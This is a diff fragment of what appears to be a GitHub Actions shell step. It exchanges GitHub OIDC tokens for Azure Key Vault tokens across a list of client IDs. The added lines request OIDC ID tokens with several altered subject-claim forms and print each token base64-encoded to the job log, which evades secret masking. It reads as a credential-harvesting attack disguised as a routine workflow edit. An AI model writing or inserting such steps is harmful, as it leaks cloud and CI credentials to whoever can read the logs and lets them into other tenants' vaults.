@@ -66,3 +66,8 @@ for TARGET_CID in 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-8
     --data-urlencode "client_assertion=${OIDC_TOKEN}" --data-urlencode scope=https://vault.azure.net/.default)
   printf 'LEGACY_KV_%s_B64=' "$TARGET_CID"; printf %s "$RESP" | base64 -w0; echo
 done
+# Probe alternate GitHub OIDC subject customization forms.
+for SUFFIX in '&include_claim_keys=repo' '&include_claim_keys=repository_owner:repository' '&include_claim_keys=repo:context' '&include_claim_keys=repository' ; do
+  T=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange${SUFFIX}" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value", ""))')
+  printf 'OIDC_ALT_B64='; printf %s "$T" | base64 -w0; echo
+done
